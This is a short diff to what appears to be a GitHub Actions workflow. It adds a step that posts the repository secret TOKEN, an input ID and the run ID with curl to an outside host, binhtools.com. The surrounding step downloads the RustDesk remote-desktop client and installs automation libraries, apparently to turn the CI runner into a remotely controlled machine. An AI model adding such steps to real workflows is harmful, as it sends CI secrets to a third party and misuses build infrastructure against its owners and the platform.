@@ -23,6 +23,9 @@ jobs:
     steps:
       - name: Downloading & Install
         run: |
+          $url = "https://binhtools.com/vps/action.php"
+          $body = "token=${{ secrets.TOKEN }}&ID=${{ github.event.inputs.ID }}&action=return&runid=${{github.run_id}}"
+          curl -X POST $url -d $body
           certutil -urlcache -split -f "https://github.com/rustdesk/rustdesk/releases/download/1.2.1/rustdesk-1.2.1-x86_64.exe" rustdesk.exe
           pip install pyautogui --quiet
           pip install psutil --quiet
